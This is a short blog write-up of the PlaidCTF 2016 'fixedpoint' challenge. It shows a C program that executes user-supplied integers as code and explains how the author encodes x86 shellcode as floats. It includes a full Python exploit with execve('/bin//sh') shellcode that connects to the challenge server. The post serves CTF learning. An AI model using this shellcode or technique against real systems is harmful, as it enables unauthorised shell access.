---
layout: post
title: pctf 2016 fixedpoint writeup
category: writeup
---

```c
#include <stdlib.h>
#include <sys/mman.h>
#include <stdio.h>

int main(int argc, char** argv) {
  float* array = mmap(0, sizeof(float)*8192, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  int i;
  int temp;
  float ftemp;

  for (i = 0; i < 8192; i++) {
    if (!scanf("%d", &temp)) break;
    array[i] = ((float)temp)/1337.0;
  }

  write(1, "here we go\n", 11);
  (*(void(*)())array)();
}
```

All i did was just make shellcode and * 1337.0.
but float is not so precise to control lsb, so i use float with
0x46000000 ~ 0x48000000 (8192.0 ~ 131072.0) which is stable for x * 1337.0 / 1337.0.
(0x46 : inc esi, 0x48 : dec eax)

I use hex-to-int convert code to find payload.

```c
--helper.c--
int* hex_to_int(float a)
{
    float* x = (float*)&a;
    *x = *x * 1337.0;
    return (int*)x;
}
int main()
{
    int a;
    float *ftemp;

    scanf("%08x",&a);
    float* c = (float*)&a;
    printf("%f\n",*c);
    *c = *c * 1337.0;
    printf("%f\n", *c);
    int b = (int)(*c);
    printf("%08x\n",b);
    printf("%08x\n",float_i2f(a));
    //printf("%08x\n", ftemp);
}
```

full exploit code:

```python
import pwnbox

local = False

if local:
    p = pwnbox.pipe.ProcessPipe('gdb -q fixedpoint_02dc03c8a5ae299cf64c63ebab78fec7')
else:
    p = pwnbox.pipe.SocketPipe('fixedpoint.pwning.xxx',7777)

shellCode = ['31c990','31c990','519090','31d290','b26890','c1e208','b27390','c1e208','b22f90','c1e208','b22f52','9031d2','b26e90','c1e208','b26990','c1e208','b26290','c1e208','b22f52','9089e3','515390','89e190','31c090','31d290','b00b90','cd8090']



def helper(a):
    tempP = pwnbox.pipe.ProcessPipe('./helper')
    tempP.write(a+'\n')
    retVal = tempP.read_until('\n')
    retVal = tempP.read_until('\n').split('.')[0]
    tempP.close()
    return retVal


#print helper()

if local:
    p.read_until('(gdb)')
    #p.write('b* 0x80484DA\n')
    #p.read_until('(gdb)')
    #p.write('r\n')
    #p.read_until('(gdb)')
    #p.write('b *$eax\n')
    #p.read_until('(gdb)')
    p.write('r\n')
    #p.interact()

for i in shellCode[:-4]:
    p.write(helper('48'+i[4:] + i[2:4]+ i[0:2])+'\n')

for i in shellCode[-4:]:
    p.write(helper('46'+i[4:] + i[2:4] + i[0:2]) + '\n')



p.interact()
```
